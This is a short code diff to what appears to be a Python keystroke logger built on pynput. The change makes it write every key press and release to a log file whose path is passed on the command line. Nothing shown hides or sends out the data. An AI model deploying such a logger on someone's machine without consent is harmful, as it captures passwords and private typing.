@@ -3,15 +3,14 @@ from pynput.keyboard import Key, Listener
 from pynput import keyboard
 import logging
 import time
-
-log_dir = os.getcwd()+'/'
-logging.basicConfig(filename = (log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+import sys
 
 def main():
-	start('test', 'test')
-	# deosnt work (gets stuck on with)
-	time.sleep(100)
-	stop()
+	try:
+		start(sys.argv[1])
+	except:
+		start('data/error.txt')
+	# doesnt work (gets stuck on with)
 
 def on_press(key):
 	try:
@@ -30,7 +29,9 @@ def on_release(key):
 			key))
 
 
-def start(session, user):
+def start(path):
+	logging.basicConfig(filename = path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+	print("working")
 	with keyboard.Listener(
 			on_press=on_press,
 			on_release=on_release) as listener:
